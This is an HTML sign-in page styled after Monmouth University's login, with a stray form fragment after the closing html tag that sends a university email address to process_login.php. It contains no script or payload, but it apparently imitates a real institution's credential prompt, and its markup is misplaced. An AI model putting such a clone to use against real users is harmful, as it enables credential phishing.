<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="fullPage">
        <div id="brandingWrapper" class="float"></div>
        <div id="contentWrapper" class="float"></div>
    </div>
    <footer>
        <a href="#">Home Page</a> |
        <a href="#">Campus Technology</a> |
        <a href="#">E-Mail HelpDesk</a>
    </footer>
</body>
</html>



<div class="login-box">
            <img src="assets/monmouth-logo.png" alt="Monmouth University Logo" class="logo">
            <h2>Sign in</h2>
            <form action="process_login.php" method="POST">
                <input type="email" name="email" placeholder="your_email@monmouth.edu" required>
                <button type="submit">Next</button>
            </form>
        </div>